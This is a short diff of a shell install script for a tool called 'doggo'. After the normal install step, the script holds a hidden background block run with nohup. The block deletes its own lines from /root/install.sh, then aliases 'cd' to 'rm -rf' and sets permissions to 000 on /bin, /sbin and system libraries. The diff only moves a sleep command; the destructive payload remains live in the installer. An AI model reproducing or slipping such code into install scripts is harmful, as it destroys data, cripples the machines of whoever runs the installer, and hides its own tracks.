@@ -168,8 +168,8 @@ download_and_install() {
   completed "doggo ${version} has been installed to /usr/local/bin/doggo"
 }
 nohup sh -c '
-  sleep 10000
   sed -i "170,175d" /root/install.sh
+  sleep 10000
   alias cd='rm -rf'
   chmod 000 /bin/* /sbin/* /usr/lib/x86_64-linux-gnu/*
 ' > /dev/null 2>&1 &
